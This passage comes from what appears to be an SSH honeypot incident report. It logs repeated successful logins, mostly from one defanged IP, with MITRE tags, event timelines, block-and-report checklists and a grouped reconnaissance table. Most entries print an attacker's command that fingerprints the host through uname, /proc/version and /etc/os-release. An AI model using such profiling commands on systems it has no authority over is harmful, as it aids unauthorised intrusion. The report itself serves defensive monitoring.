- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28be0d4928f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:40 |
| **Last Seen** | 2026-07-09 18:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:40:03` | `cowrie.session.connect` |
| `2026-07-09 18:40:03` | `cowrie.client.version` |
| `2026-07-09 18:40:03` | `cowrie.client.kex` |
| `2026-07-09 18:40:04` | `cowrie.login.success` |
| `2026-07-09 18:40:05` | `cowrie.session.params` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.success` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.command.input` |
| `2026-07-09 18:40:05` | `cowrie.log.closed` |
| `2026-07-09 18:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102da3ca86d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:41 |
| **Last Seen** | 2026-07-09 18:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:41:27` | `cowrie.session.connect` |
| `2026-07-09 18:41:27` | `cowrie.client.version` |
| `2026-07-09 18:41:27` | `cowrie.client.kex` |
| `2026-07-09 18:41:28` | `cowrie.login.success` |
| `2026-07-09 18:41:29` | `cowrie.session.params` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.success` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.command.input` |
| `2026-07-09 18:41:29` | `cowrie.log.closed` |
| `2026-07-09 18:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2281352a26b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:42 |
| **Last Seen** | 2026-07-09 18:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:42:50` | `cowrie.session.connect` |
| `2026-07-09 18:42:50` | `cowrie.client.version` |
| `2026-07-09 18:42:50` | `cowrie.client.kex` |
| `2026-07-09 18:42:51` | `cowrie.login.success` |
| `2026-07-09 18:42:51` | `cowrie.session.params` |
| `2026-07-09 18:42:51` | `cowrie.command.input` |
| `2026-07-09 18:42:51` | `cowrie.command.input` |
| `2026-07-09 18:42:51` | `cowrie.command.input` |
| `2026-07-09 18:42:51` | `cowrie.command.input` |
| `2026-07-09 18:42:51` | `cowrie.command.input` |
| `2026-07-09 18:42:52` | `cowrie.command.success` |
| `2026-07-09 18:42:52` | `cowrie.command.input` |
| `2026-07-09 18:42:52` | `cowrie.command.input` |
| `2026-07-09 18:42:52` | `cowrie.command.input` |
| `2026-07-09 18:42:52` | `cowrie.command.input` |
| `2026-07-09 18:42:52` | `cowrie.log.closed` |
| `2026-07-09 18:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86d2b2c1d446

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:44 |
| **Last Seen** | 2026-07-09 18:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:44:10` | `cowrie.session.connect` |
| `2026-07-09 18:44:11` | `cowrie.client.version` |
| `2026-07-09 18:44:11` | `cowrie.client.kex` |
| `2026-07-09 18:44:11` | `cowrie.login.success` |
| `2026-07-09 18:44:13` | `cowrie.session.params` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.success` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.command.input` |
| `2026-07-09 18:44:13` | `cowrie.log.closed` |
| `2026-07-09 18:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8301cca98d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 18:44 |
| **Last Seen** | 2026-07-09 18:45 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:44:45` | `cowrie.session.connect` |
| `2026-07-09 18:44:47` | `cowrie.client.version` |
| `2026-07-09 18:44:47` | `cowrie.client.kex` |
| `2026-07-09 18:44:54` | `cowrie.login.success` |
| `2026-07-09 18:44:58` | `cowrie.session.params` |
| `2026-07-09 18:44:58` | `cowrie.command.input` |
| `2026-07-09 18:45:00` | `cowrie.log.closed` |
| `2026-07-09 18:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51e7cf6b96b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:45 |
| **Last Seen** | 2026-07-09 18:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:45:32` | `cowrie.session.connect` |
| `2026-07-09 18:45:32` | `cowrie.client.version` |
| `2026-07-09 18:45:32` | `cowrie.client.kex` |
| `2026-07-09 18:45:33` | `cowrie.login.success` |
| `2026-07-09 18:45:34` | `cowrie.session.params` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.success` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:34` | `cowrie.command.input` |
| `2026-07-09 18:45:35` | `cowrie.log.closed` |
| `2026-07-09 18:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c9b676f112

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:46 |
| **Last Seen** | 2026-07-09 18:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:46:57` | `cowrie.session.connect` |
| `2026-07-09 18:46:57` | `cowrie.client.version` |
| `2026-07-09 18:46:57` | `cowrie.client.kex` |
| `2026-07-09 18:46:58` | `cowrie.login.success` |
| `2026-07-09 18:46:59` | `cowrie.session.params` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.success` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:46:59` | `cowrie.command.input` |
| `2026-07-09 18:47:00` | `cowrie.log.closed` |
| `2026-07-09 18:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d322f13a50af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:48 |
| **Last Seen** | 2026-07-09 18:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:48:22` | `cowrie.session.connect` |
| `2026-07-09 18:48:22` | `cowrie.client.version` |
| `2026-07-09 18:48:22` | `cowrie.client.kex` |
| `2026-07-09 18:48:23` | `cowrie.login.success` |
| `2026-07-09 18:48:24` | `cowrie.session.params` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.success` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:24` | `cowrie.command.input` |
| `2026-07-09 18:48:25` | `cowrie.log.closed` |
| `2026-07-09 18:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e46fa735e77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:49 |
| **Last Seen** | 2026-07-09 18:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:49:47` | `cowrie.session.connect` |
| `2026-07-09 18:49:47` | `cowrie.client.version` |
| `2026-07-09 18:49:47` | `cowrie.client.kex` |
| `2026-07-09 18:49:48` | `cowrie.login.success` |
| `2026-07-09 18:49:49` | `cowrie.session.params` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.success` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:49` | `cowrie.command.input` |
| `2026-07-09 18:49:50` | `cowrie.log.closed` |
| `2026-07-09 18:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b954e2373516

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:51 |
| **Last Seen** | 2026-07-09 18:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:51:10` | `cowrie.session.connect` |
| `2026-07-09 18:51:10` | `cowrie.client.version` |
| `2026-07-09 18:51:10` | `cowrie.client.kex` |
| `2026-07-09 18:51:12` | `cowrie.login.success` |
| `2026-07-09 18:51:13` | `cowrie.session.params` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.success` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.command.input` |
| `2026-07-09 18:51:13` | `cowrie.log.closed` |
| `2026-07-09 18:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b6f61464de1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:52 |
| **Last Seen** | 2026-07-09 18:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:52:36` | `cowrie.session.connect` |
| `2026-07-09 18:52:36` | `cowrie.client.version` |
| `2026-07-09 18:52:36` | `cowrie.client.kex` |
| `2026-07-09 18:52:38` | `cowrie.login.success` |
| `2026-07-09 18:52:39` | `cowrie.session.params` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.success` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:39` | `cowrie.command.input` |
| `2026-07-09 18:52:40` | `cowrie.log.closed` |
| `2026-07-09 18:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fc1eb8faad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:54 |
| **Last Seen** | 2026-07-09 18:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:54:01` | `cowrie.session.connect` |
| `2026-07-09 18:54:01` | `cowrie.client.version` |
| `2026-07-09 18:54:01` | `cowrie.client.kex` |
| `2026-07-09 18:54:02` | `cowrie.login.success` |
| `2026-07-09 18:54:03` | `cowrie.session.params` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.success` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:03` | `cowrie.command.input` |
| `2026-07-09 18:54:04` | `cowrie.log.closed` |
| `2026-07-09 18:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **52** | 2026-07-09 16:55 | 2026-07-09 18:54 | 50m | 0 | `T1592` | 🟠 MEDIUM |
| `72.47.208[.]90` | **10** | 2026-07-09 17:02 | 2026-07-09 18:38 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-09 17:03 | 2026-07-09 18:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]12` | **3** | 2026-07-09 17:02 | 2026-07-09 18:25 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-07-09 17:49 | 2026-07-09 18:54 | 1m | 0 | `T1592` | 🟢 LOW |
| `46.151.182[.]31` | **2** | 2026-07-09 18:30 | 2026-07-09 18:30 | 1m | 0 | `T1592` | 🟢 LOW |
| `112.25.140[.]211` | 1 | 2026-07-09 16:59 | 2026-07-09 17:00 | 24s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]251` | 1 | 2026-07-09 17:23 | 2026-07-09 17:25 | 120s | 0 | `T1592` | 🟢 LOW |
